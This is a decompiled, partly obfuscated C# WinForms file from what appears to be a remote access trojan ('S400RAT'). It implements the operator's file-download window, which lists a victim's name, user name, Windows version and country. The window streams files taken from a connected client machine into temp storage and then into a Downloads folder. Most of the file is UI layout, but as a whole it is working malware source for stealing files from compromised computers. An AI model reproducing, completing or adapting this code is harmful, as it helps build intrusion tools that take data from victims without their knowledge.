using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SQLABC_ModernUI;

namespace S400RAT;

[DesignerGenerated]
public class DW : Form
{
	public IContainer icontainer_0;

	[AccessedThroughProperty("Timer1")]
	[CompilerGenerated]
	public Timer timer_0;

	[AccessedThroughProperty("Guna2AnimateWindow1")]
	[CompilerGenerated]
	public Guna2AnimateWindow guna2AnimateWindow_0;

	[AccessedThroughProperty("Guna2BorderlessForm1")]
	[CompilerGenerated]
	public Guna2BorderlessForm guna2BorderlessForm_0;

	[CompilerGenerated]
	[AccessedThroughProperty("ProgressBar1")]
	public Guna2CircleProgressBar guna2CircleProgressBar_0;

	[AccessedThroughProperty("Button1")]
	[CompilerGenerated]
	public Guna2GradientButton guna2GradientButton_0;

	[AccessedThroughProperty("panel1")]
	[CompilerGenerated]
	public Panel panel_0;

	[AccessedThroughProperty("panel2")]
	[CompilerGenerated]
	public Panel lcetgaasJv;

	[AccessedThroughProperty("pictureBox1")]
	[CompilerGenerated]
	public PictureBox pictureBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("D")]
	public Guna2HtmlLabel guna2HtmlLabel_0;

	[CompilerGenerated]
	[AccessedThroughProperty("P")]
	public Guna2HtmlLabel guna2HtmlLabel_1;

	[CompilerGenerated]
	[AccessedThroughProperty("S")]
	public Guna2HtmlLabel guna2HtmlLabel_2;

	[CompilerGenerated]
	[AccessedThroughProperty("F")]
	public Guna2HtmlLabel guna2HtmlLabel_3;

	[AccessedThroughProperty("Guna2ControlBox1")]
	[CompilerGenerated]
	public Guna2ControlBox guna2ControlBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel3")]
	public Panel panel_1;

	[CompilerGenerated]
	[AccessedThroughProperty("panel5")]
	public Panel panel_2;

	[CompilerGenerated]
	[AccessedThroughProperty("ADD")]
	public Label label_0;

	[CompilerGenerated]
	[AccessedThroughProperty("WindowsWindows10ToolStripMenuItem")]
	public Label label_1;

	[CompilerGenerated]
	[AccessedThroughProperty("UserNameFCToolStripMenuItem")]
	public Label label_2;

	[AccessedThroughProperty("Namevctim")]
	[CompilerGenerated]
	public Label label_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Label10")]
	public Label label_4;

	[AccessedThroughProperty("Label7")]
	[CompilerGenerated]
	public Label label_5;

	[AccessedThroughProperty("Label5")]
	[CompilerGenerated]
	public Label label_6;

	[AccessedThroughProperty("pictureBox3")]
	[CompilerGenerated]
	public PictureBox pictureBox_1;

	[AccessedThroughProperty("label8")]
	[CompilerGenerated]
	public Label OgHtnirwCa;

	[AccessedThroughProperty("label9")]
	[CompilerGenerated]
	public Label label_7;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox2")]
	public PictureBox pictureBox_2;

	[AccessedThroughProperty("SqlabC_ControlMini1")]
	[CompilerGenerated]
	public SQLABC_ControlMini sqlabc_ControlMini_0;

	public Client c;

	public string FN;

	public string folder;

	public FileStream FS;

	public int os;

	public Client osk;

	public int SZ;

	public string tmp;

	internal virtual Guna2CircleProgressBar ProgressBar1
	{
		[CompilerGenerated]
		get
		{
			return guna2CircleProgressBar_0;
		}
		[CompilerGenerated]
		set
		{
			guna2CircleProgressBar_0 = value;
		}
	}

	internal virtual Guna2GradientButton Button1
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_2;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_0 = value;
			guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	public virtual Panel panel1
	{
		[CompilerGenerated]
		get
		{
			return panel_0;
		}
		[CompilerGenerated]
		set
		{
			panel_0 = value;
		}
	}

	public virtual Panel panel2
	{
		[CompilerGenerated]
		get
		{
			return lcetgaasJv;
		}
		[CompilerGenerated]
		set
		{
			lcetgaasJv = value;
		}
	}

	public virtual PictureBox pictureBox1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	internal virtual Guna2HtmlLabel D
	{
		[CompilerGenerated]
		get
		{
			return guna2HtmlLabel_0;
		}
		[CompilerGenerated]
		set
		{
			guna2HtmlLabel_0 = value;
		}
	}

	internal virtual Guna2HtmlLabel P
	{
		[CompilerGenerated]
		get
		{
			return guna2HtmlLabel_1;
		}
		[CompilerGenerated]
		set
		{
			guna2HtmlLabel_1 = value;
		}
	}

	internal virtual Guna2HtmlLabel S
	{
		[CompilerGenerated]
		get
		{
			return guna2HtmlLabel_2;
		}
		[CompilerGenerated]
		set
		{
			guna2HtmlLabel_2 = value;
		}
	}

	internal virtual Guna2HtmlLabel F
	{
		[CompilerGenerated]
		get
		{
			return guna2HtmlLabel_3;
		}
		[CompilerGenerated]
		set
		{
			guna2HtmlLabel_3 = value;
		}
	}

	internal virtual Guna2ControlBox Guna2ControlBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ControlBox_0;
		}
		[CompilerGenerated]
		set
		{
			guna2ControlBox_0 = value;
		}
	}

	internal virtual Panel Panel3
	{
		[CompilerGenerated]
		get
		{
			return panel_1;
		}
		[CompilerGenerated]
		set
		{
			panel_1 = value;
		}
	}

	public virtual Panel panel5
	{
		[CompilerGenerated]
		get
		{
			return panel_2;
		}
		[CompilerGenerated]
		set
		{
			panel_2 = value;
		}
	}

	public virtual Label ADD
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[CompilerGenerated]
		set
		{
			label_0 = value;
		}
	}

	public virtual Label WindowsWindows10ToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return label_1;
		}
		[CompilerGenerated]
		set
		{
			label_1 = value;
		}
	}

	public virtual Label UserNameFCToolStripMenuItem
	{
		[CompilerGenerated]
		get
		{
			return label_2;
		}
		[CompilerGenerated]
		set
		{
			label_2 = value;
		}
	}

	public virtual Label Namevctim
	{
		[CompilerGenerated]
		get
		{
			return label_3;
		}
		[CompilerGenerated]
		set
		{
			label_3 = value;
		}
	}

	public virtual Label Label10
	{
		[CompilerGenerated]
		get
		{
			return label_4;
		}
		[CompilerGenerated]
		set
		{
			label_4 = value;
		}
	}

	public virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return label_5;
		}
		[CompilerGenerated]
		set
		{
			label_5 = value;
		}
	}

	public virtual Label Label5
	{
		[CompilerGenerated]
		get
		{
			return label_6;
		}
		[CompilerGenerated]
		set
		{
			label_6 = value;
		}
	}

	public virtual PictureBox pictureBox3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_1 = value;
		}
	}

	public virtual Label label8
	{
		[CompilerGenerated]
		get
		{
			return OgHtnirwCa;
		}
		[CompilerGenerated]
		set
		{
			OgHtnirwCa = value;
		}
	}

	public virtual Label label9
	{
		[CompilerGenerated]
		get
		{
			return label_7;
		}
		[CompilerGenerated]
		set
		{
			label_7 = value;
		}
	}

	internal virtual PictureBox PictureBox2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_2 = value;
		}
	}

	internal virtual SQLABC_ControlMini SqlabC_ControlMini1
	{
		[CompilerGenerated]
		get
		{
			return sqlabc_ControlMini_0;
		}
		[CompilerGenerated]
		set
		{
			sqlabc_ControlMini_0 = value;
		}
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	public void method_0()
	{
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(DW));
		vmethod_1(new Timer(icontainer_0));
		vmethod_3(new Guna2AnimateWindow(icontainer_0));
		vmethod_5(new Guna2BorderlessForm(icontainer_0));
		ProgressBar1 = new Guna2CircleProgressBar();
		Button1 = new Guna2GradientButton();
		panel1 = new Panel();
		panel2 = new Panel();
		PictureBox2 = new PictureBox();
		pictureBox1 = new PictureBox();
		F = new Guna2HtmlLabel();
		S = new Guna2HtmlLabel();
		P = new Guna2HtmlLabel();
		D = new Guna2HtmlLabel();
		Guna2ControlBox1 = new Guna2ControlBox();
		Panel3 = new Panel();
		panel5 = new Panel();
		ADD = new Label();
		WindowsWindows10ToolStripMenuItem = new Label();
		UserNameFCToolStripMenuItem = new Label();
		Namevctim = new Label();
		Label10 = new Label();
		Label7 = new Label();
		Label5 = new Label();
		pictureBox3 = new PictureBox();
		label8 = new Label();
		label9 = new Label();
		SqlabC_ControlMini1 = new SQLABC_ControlMini();
		panel1.SuspendLayout();
		panel2.SuspendLayout();
		((ISupportInitialize)PictureBox2).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		Panel3.SuspendLayout();
		panel5.SuspendLayout();
		((ISupportInitialize)pictureBox3).BeginInit();
		SuspendLayout();
		vmethod_0().Interval = 1000;
		vmethod_2().AnimationType = Guna2AnimateWindow.AnimateWindowType.AW_BLEND;
		vmethod_2().TargetForm = this;
		vmethod_4().ContainerControl = this;
		ProgressBar1.FillThickness = 10;
		ProgressBar1.Location = new Point(7, 10);
		ProgressBar1.Name = "ProgressBar1";
		ProgressBar1.ProgressColor = Color.FromArgb(84, 131, 255);
		ProgressBar1.ProgressColor2 = Color.FromArgb(0, 126, 249);
		ProgressBar1.ProgressThickness = 10;
		ProgressBar1.ShadowDecoration.Mode = ShadowMode.Circle;
		ProgressBar1.ShadowDecoration.Parent = ProgressBar1;
		ProgressBar1.Size = new Size(83, 80);
		ProgressBar1.TabIndex = 70;
		Button1.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
		Button1.Animated = true;
		Button1.AutoRoundedCorners = true;
		Button1.BackColor = Color.Transparent;
		Button1.BorderRadius = 39;
		Button1.CheckedState.Parent = Button1;
		Button1.CustomImages.Parent = Button1;
		Button1.FillColor = Color.FromArgb(46, 51, 73);
		Button1.FillColor2 = Color.FromArgb(46, 51, 73);
		Button1.Font = new Font("Segoe UI", 9f);
		Button1.ForeColor = Color.White;
		Button1.HoverState.Parent = Button1;
		Button1.IndicateFocus = true;
		Button1.Location = new Point(3, 144);
		Button1.Name = "Button1";
		Button1.ShadowDecoration.Parent = Button1;
		Button1.Size = new Size(171, 80);
		Button1.TabIndex = 77;
		Button1.Text = "Stop";
		Button1.UseTransparentBackground = true;
		panel1.BackColor = Color.FromArgb(24, 30, 54);
		panel1.Controls.Add(panel2);
		panel1.Controls.Add(Button1);
		panel1.Dock = DockStyle.Left;
		panel1.Location = new Point(0, 0);
		panel1.Name = "panel1";
		panel1.Size = new Size(186, 236);
		panel1.TabIndex = 78;
		panel2.Controls.Add(PictureBox2);
		panel2.Controls.Add(pictureBox1);
		panel2.Dock = DockStyle.Top;
		panel2.Location = new Point(0, 0);
		panel2.Name = "panel2";
		panel2.Size = new Size(186, 128);
		panel2.TabIndex = 0;
		PictureBox2.Image = (Image)componentResourceManager.GetObject("PictureBox2.Image");
		PictureBox2.Location = new Point(12, 77);
		PictureBox2.Name = "PictureBox2";
		PictureBox2.Size = new Size(162, 42);
		PictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox2.TabIndex = 10;
		PictureBox2.TabStop = false;
		pictureBox1.Image = (Image)componentResourceManager.GetObject("pictureBox1.Image");
		pictureBox1.Location = new Point(57, 8);
		pictureBox1.Name = "pictureBox1";
		pictureBox1.Size = new Size(63, 63);
		pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
		pictureBox1.TabIndex = 0;
		pictureBox1.TabStop = false;
		F.BackColor = Color.Transparent;
		F.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		F.ForeColor = Color.FromArgb(224, 224, 224);
		F.Location = new Point(104, 10);
		F.Name = "F";
		F.Size = new Size(28, 16);
		F.TabIndex = 81;
		F.Text = "File : ";
		S.BackColor = Color.Transparent;
		S.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		S.ForeColor = Color.FromArgb(224, 224, 224);
		S.Location = new Point(104, 32);
		S.Name = "S";
		S.Size = new Size(32, 16);
		S.TabIndex = 82;
		S.Text = "Size :";
		P.BackColor = Color.Transparent;
		P.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		P.ForeColor = Color.FromArgb(224, 224, 224);
		P.Location = new Point(104, 52);
		P.Name = "P";
		P.Size = new Size(44, 16);
		P.TabIndex = 83;
		P.Text = "Speed  :";
		D.BackColor = Color.Transparent;
		D.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		D.ForeColor = Color.FromArgb(224, 224, 224);
		D.Location = new Point(104, 74);
		D.Name = "D";
		D.Size = new Size(77, 16);
		D.TabIndex = 84;
		D.Text = "Downloaded  :";
		Guna2ControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2ControlBox1.BorderColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.FillColor = Color.FromArgb(24, 30, 54);
		Guna2ControlBox1.HoverState.Parent = Guna2ControlBox1;
		Guna2ControlBox1.IconColor = Color.White;
		Guna2ControlBox1.Location = new Point(779, 0);
		Guna2ControlBox1.Name = "Guna2ControlBox1";
		Guna2ControlBox1.PressedColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.ShadowDecoration.Parent = Guna2ControlBox1;
		Guna2ControlBox1.Size = new Size(45, 29);
		Guna2ControlBox1.TabIndex = 85;
		Panel3.BackColor = Color.FromArgb(46, 51, 73);
		Panel3.Controls.Add(ProgressBar1);
		Panel3.Controls.Add(F);
		Panel3.Controls.Add(S);
		Panel3.Controls.Add(D);
		Panel3.Controls.Add(P);
		Panel3.Dock = DockStyle.Bottom;
		Panel3.Location = new Point(186, 138);
		Panel3.Name = "Panel3";
		Panel3.Size = new Size(638, 98);
		Panel3.TabIndex = 89;
		panel5.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		panel5.BackColor = Color.FromArgb(37, 42, 64);
		panel5.Controls.Add(ADD);
		panel5.Controls.Add(WindowsWindows10ToolStripMenuItem);
		panel5.Controls.Add(UserNameFCToolStripMenuItem);
		panel5.Controls.Add(Namevctim);
		panel5.Controls.Add(Label10);
		panel5.Controls.Add(Label7);
		panel5.Controls.Add(Label5);
		panel5.Controls.Add(pictureBox3);
		panel5.Controls.Add(label8);
		panel5.Controls.Add(label9);
		panel5.Location = new Point(196, 0);
		panel5.Name = "panel5";
		panel5.Size = new Size(345, 130);
		panel5.TabIndex = 90;
		ADD.AutoSize = true;
		ADD.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		ADD.ForeColor = Color.FromArgb(158, 161, 176);
		ADD.Location = new Point(98, 102);
		ADD.Name = "ADD";
		ADD.Size = new Size(18, 17);
		ADD.TabIndex = 9;
		ADD.Text = "--";
		WindowsWindows10ToolStripMenuItem.AutoSize = true;
		WindowsWindows10ToolStripMenuItem.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		WindowsWindows10ToolStripMenuItem.ForeColor = Color.FromArgb(158, 161, 176);
		WindowsWindows10ToolStripMenuItem.Location = new Point(98, 81);
		WindowsWindows10ToolStripMenuItem.Name = "WindowsWindows10ToolStripMenuItem";
		WindowsWindows10ToolStripMenuItem.Size = new Size(18, 17);
		WindowsWindows10ToolStripMenuItem.TabIndex = 8;
		WindowsWindows10ToolStripMenuItem.Text = "--";
		UserNameFCToolStripMenuItem.AutoSize = true;
		UserNameFCToolStripMenuItem.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		UserNameFCToolStripMenuItem.ForeColor = Color.FromArgb(158, 161, 176);
		UserNameFCToolStripMenuItem.Location = new Point(98, 60);
		UserNameFCToolStripMenuItem.Name = "UserNameFCToolStripMenuItem";
		UserNameFCToolStripMenuItem.Size = new Size(18, 17);
		UserNameFCToolStripMenuItem.TabIndex = 7;
		UserNameFCToolStripMenuItem.Text = "--";
		Namevctim.AutoSize = true;
		Namevctim.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Namevctim.ForeColor = Color.FromArgb(158, 161, 176);
		Namevctim.Location = new Point(98, 39);
		Namevctim.Name = "Namevctim";
		Namevctim.Size = new Size(18, 17);
		Namevctim.TabIndex = 6;
		Namevctim.Text = "--";
		Label10.AutoSize = true;
		Label10.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label10.ForeColor = Color.FromArgb(158, 161, 176);
		Label10.Location = new Point(30, 102);
		Label10.Name = "Label10";
		Label10.Size = new Size(61, 17);
		Label10.TabIndex = 5;
		Label10.Text = "Country :";
		Label7.AutoSize = true;
		Label7.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label7.ForeColor = Color.FromArgb(158, 161, 176);
		Label7.Location = new Point(23, 81);
		Label7.Name = "Label7";
		Label7.Size = new Size(68, 17);
		Label7.TabIndex = 4;
		Label7.Text = "Windows :";
		Label5.AutoSize = true;
		Label5.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label5.ForeColor = Color.FromArgb(158, 161, 176);
		Label5.Location = new Point(10, 60);
		Label5.Name = "Label5";
		Label5.Size = new Size(81, 17);
		Label5.TabIndex = 3;
		Label5.Text = "User Name :";
		pictureBox3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		pictureBox3.Image = (Image)componentResourceManager.GetObject("pictureBox3.Image");
		pictureBox3.Location = new Point(281, 19);
		pictureBox3.Name = "pictureBox3";
		pictureBox3.Size = new Size(53, 58);
		pictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
		pictureBox3.TabIndex = 2;
		pictureBox3.TabStop = false;
		label8.AutoSize = true;
		label8.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		label8.ForeColor = Color.FromArgb(158, 161, 176);
		label8.Location = new Point(41, 39);
		label8.Name = "label8";
		label8.Size = new Size(50, 17);
		label8.TabIndex = 0;
		label8.Text = "Name :";
		label9.AutoSize = true;
		label9.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		label9.ForeColor = Color.FromArgb(84, 131, 255);
		label9.Location = new Point(17, 9);
		label9.Name = "label9";
		label9.Size = new Size(111, 25);
		label9.TabIndex = 0;
		label9.Text = "Information";
		SqlabC_ControlMini1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		SqlabC_ControlMini1.BackColor = Color.White;
		SqlabC_ControlMini1.BaseColor = Color.FromArgb(46, 51, 73);
		SqlabC_ControlMini1.Font = new Font("Marlett", 12f);
		SqlabC_ControlMini1.Location = new Point(755, 6);
		SqlabC_ControlMini1.Name = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.Size = new Size(18, 18);
		SqlabC_ControlMini1.TabIndex = 134;
		SqlabC_ControlMini1.Text = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.TextColor = Color.FromArgb(243, 243, 243);
		base.AutoScaleMode = AutoScaleMode.None;
		BackColor = Color.FromArgb(24, 30, 54);
		base.ClientSize = new Size(824, 236);
		base.Controls.Add(SqlabC_ControlMini1);
		base.Controls.Add(panel5);
		base.Controls.Add(Panel3);
		base.Controls.Add(Guna2ControlBox1);
		base.Controls.Add(panel1);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Name = "DW";
		base.StartPosition = FormStartPosition.CenterScreen;
		Text = "DW";
		panel1.ResumeLayout(performLayout: false);
		panel2.ResumeLayout(performLayout: false);
		((ISupportInitialize)PictureBox2).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		Panel3.ResumeLayout(performLayout: false);
		Panel3.PerformLayout();
		panel5.ResumeLayout(performLayout: false);
		panel5.PerformLayout();
		((ISupportInitialize)pictureBox3).EndInit();
		ResumeLayout(performLayout: false);
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_0()
	{
		return timer_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_1(Timer WithEventsValue)
	{
		EventHandler value = method_1;
		Timer timer = timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_0 = WithEventsValue;
		timer = timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2AnimateWindow vmethod_2()
	{
		return guna2AnimateWindow_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_3(Guna2AnimateWindow WithEventsValue)
	{
		guna2AnimateWindow_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2BorderlessForm vmethod_4()
	{
		return guna2BorderlessForm_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_5(Guna2BorderlessForm WithEventsValue)
	{
		guna2BorderlessForm_0 = WithEventsValue;
	}

	public DW()
	{
		base.FormClosing += DW_FormClosing;
		base.Load += DW_Load;
		os = 0;
		method_0();
	}

	public void DW_FormClosing(object sender, FormClosingEventArgs e)
	{
		try
		{
			FS.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			FS.Dispose();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Delete(tmp);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		Button1.Enabled = false;
		c.CN = false;
	}

	public void DW_Load(object sender, EventArgs e)
	{
		string expression = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.gsciXiVbtJ(osk.L)));
		string[] array = Strings.Split(expression, "|'|");
		Namevctim.Text = array[1];
		UserNameFCToolStripMenuItem.Text = array[2];
		WindowsWindows10ToolStripMenuItem.Text = array[3];
		ADD.Text = array[4];
		ProgressBar1.Maximum = SZ;
		folder = osk.Folder + "Downloads\\";
		if (!Directory.Exists(folder))
		{
			Directory.CreateDirectory(folder);
		}
		folder += new FileInfo(Class6.smethod_9(FN)).Name;
		F.Text = "File : " + new FileInfo(Class6.smethod_9(FN)).Name;
		S.Text = "Size : " + Class6.smethod_10(SZ);
		do
		{
			tmp = Interaction.Environ("temp") + "\\njfm_" + Class6.smethod_14(10);
		}
		while (File.Exists(tmp));
		FS = new FileStream(tmp, FileMode.Append);
		P.Text = "Speed : 0KB";
		os = ProgressBar1.Value;
		D.Text = "Downloaded : " + Class6.smethod_10(ProgressBar1.Value);
		vmethod_0().Enabled = true;
	}

	public void method_1(object sender, EventArgs e)
	{
		try
		{
			P.Text = "Speed : " + Conversions.ToString(ProgressBar1.Value) + "KB";
			os = ProgressBar1.Value;
			D.Text = "Downloaded : " + Class6.smethod_10(ProgressBar1.Value);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_2(object sender, EventArgs e)
	{
		if (Operators.CompareString(Button1.Text, "Stop", TextCompare: false) == 0)
		{
			FS.Close();
			FS.Dispose();
			File.Delete(tmp);
			Button1.Enabled = false;
			c.CN = false;
			Close();
		}
		else
		{
			FS.Close();
			FS.Dispose();
			File.Move(tmp, folder);
		}
	}

	public void method_3(object sender, EventArgs e)
	{
		Hide();
	}
}
